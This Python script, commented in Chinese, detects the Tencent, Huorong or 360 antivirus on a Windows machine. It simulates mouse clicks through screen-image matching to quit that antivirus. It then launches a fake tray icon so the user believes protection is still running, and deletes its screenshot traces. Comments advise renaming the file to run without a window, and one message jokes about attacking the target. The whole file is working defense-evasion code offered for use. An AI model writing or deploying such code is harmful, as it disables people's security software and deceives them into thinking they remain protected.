# -*- coding: UTF-8 -*-
#--------------为了隐蔽操作，可以将py后缀改为pyw--------------
import cv2
import pyautogui
from time import sleep
import base64
import os
from sys import exit
import subprocess


# --------------Imagebase64--------------
# logo base64
b64_AV_logo = {
    "hr": b'',
    "360": b'',
    "txgj": b''
}

b64_logout = b''
b64_blue_comfirm = b''
b64_white_comfirm = b''

# --------------AV Icon(用在生成托盘图标)--------------
icon_hr = b''
icon_txgj = b''
icon_360 = b''

#--------------Tray文件base64(pyw文件)--------------
b64_Tray = b''

# --------------参数定义--------------
base_temp_path = r'C:\Users\{}\Documents\\'.format(os.popen('echo %username%').read().strip())
logoutImage = base_temp_path + r'lougoutFromB64.png'
comfireImage = base_temp_path + r'comfireFromB64.png'
logoImage = base_temp_path + r'logoFromB64.png'
screen_before = base_temp_path + r'before.png'
screen_logout = base_temp_path + r'logout.png'
screen_comfire = base_temp_path + r'comfire.png'
# 由于AV_Icon图标只能使用相对路径（bug？）所以只能在脚本当前目录的父目录（防止识别时产生识别成单前的icon）生成，完成之后删除
AV_IconPath = os.path.abspath("../")
AV_Icon = AV_IconPath + r'\AV.png'


av_process = {'txgj': ['QQPCTray.exe', icon_txgj, '腾讯管家'],
              'hr': ['HipsTray.exe', icon_hr, '火绒'],
              '360': ['360sd.exe', icon_360, '360']}  # 以字典的形式


# --------------检测目标计算机存在的杀毒软件--------------
tasklist = os.popen('wmic process get name').read().split()
for av_exe in av_process.values():
    if av_exe[0] in tasklist:
        AV = [k for k, v in av_process.items() if v[0] == av_exe[0]][0]
        # --------------Icon图标的写入--------------
        with open(AV_Icon, 'wb') as f:
            f.write(base64.b64decode(av_exe[1]))
        AV_Name = av_process[AV][2]

#  split('\n\n')为了解决获取路径后的一个目录包含空格导致的路径不全问题
processPath = os.popen(r'''wmic process where "name='{}'" get ExecutablePath'''.format(av_process[AV][0])).read().split('\n\n')[1]
print(processPath)


# --------------通过tasklist判断存在的av，获取的相应的logo--------------
def get_logo():
    try:
        # 将对应的logo写入
        logo_b64 = b64_AV_logo[AV]
        logo_img = base64.b64decode(logo_b64)
        with open(logoImage, 'wb') as f:
            f.write(logo_img)

        # 输出通用的‘退出’字符串图片
        with open(logoutImage, 'wb') as f:
            f.write(base64.b64decode(b64_logout))
        # 通过杀毒软件判断最后一步退出步骤应该使用的字样
        if AV == r'hr':
            return b64_logout
        elif AV == r'360':
            return b64_blue_comfirm
        else:
            return b64_white_comfirm
    except:
        print('主人，这家伙没开杀毒软件！！！！干他๑乛◡乛๑ ')
        exit()


# --------------定义鼠标键盘事件--------------
def press_keys(*args):
    pyautogui.hotkey(args[0], args[1])
    sleep(0.2)
    pyautogui.press(args[2])


# 截图操作
def get_screen(screenName):
    pyautogui.screenshot(screenName)


# 获取坐标操作，比对原来的截屏和待识别图标
def get_position(imgSource, imgTarget):
    source = cv2.imread(imgSource, 0)  # 0-灰度处理，防止颜色不同对定位产生影响
    target = cv2.imread(imgTarget, 0)
    wight, height = target.shape[::-1]  # 获取图片长和宽，方便确定文字的中新坐标
    res = cv2.matchTemplate(source, target, cv2.TM_CCOEFF_NORMED)
    min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)
    pos_x = int(max_loc[0] + wight / 2)
    pos_y = int(max_loc[1] + height / 2)
    print(pos_x, pos_y)
    return pos_x, pos_y


def killav():
    logout_last = get_logo()
    # 通过杀毒软件生成不同的最后一步图片
    with open(comfireImage, 'wb') as f:
        f.write(base64.b64decode(logout_last))

    sleep(1)
    press_keys('win', 'b', 'enter')
    get_screen(screen_before)
    sleep(1)
    # 右键点击logo，弹出'退出'窗口
    pyautogui.rightClick(get_position(screen_before, logoImage))

    get_screen(screen_logout)
    sleep(1)
    # 点击'退出'，出现'确认'窗口
    pyautogui.click(get_position(screen_logout, logoutImage))
    sleep(0.5)

    get_screen(screen_comfire)
    sleep(1)
    # 点击'确认'，实现对杀毒软件的完全退出
    pyautogui.click(get_position(screen_comfire, comfireImage))


# --------------清理图片痕迹--------------
def clean():
    os.popen(r'del /q {} {} {} {} {} {} {}'.format(logoutImage, logoImage, comfireImage,
                                                screen_before, screen_logout, screen_comfire, AV_Icon))

#--------------为了隐藏伪造托盘的dos窗口，可以将托盘伪造代码转为base64写入到pyw文件，然后用popen启动，将杀毒软件名字等信息作为参数传入--------------
#--------------托盘伪造--------------

# IconMouseFocusOn AV_Name processPath
def saveTrayFile():
    pywFile = AV_IconPath + '\Tray.pyw'
    print(AV_IconPath)
    with open(pywFile, 'wb') as f:
        f.write(base64.b64decode(b64_Tray))
    #--------------火绒--------------
    if AV_Name == '火绒':
        # 火绒特殊性，HipsMain只存在于主界面打开的状态，可以查找HipsTray，然后手工将HipsTray转换为HipsMian-->打开主界面
        Real_path = processPath.replace("Tray", "Main", -1)
        print(r'"{}"'.format(Real_path))
    else:
        Real_path = processPath
    # Real_path加双引号是为了防止路劲包含空格导致的错误
    cmd = r'pythonw  {} {} "{}"'.format(pywFile, AV_Name, Real_path)
    print(cmd)
    os.popen(cmd)


def main():
    killav()
    saveTrayFile()
    clean()


if __name__ == '__main__':
    main()
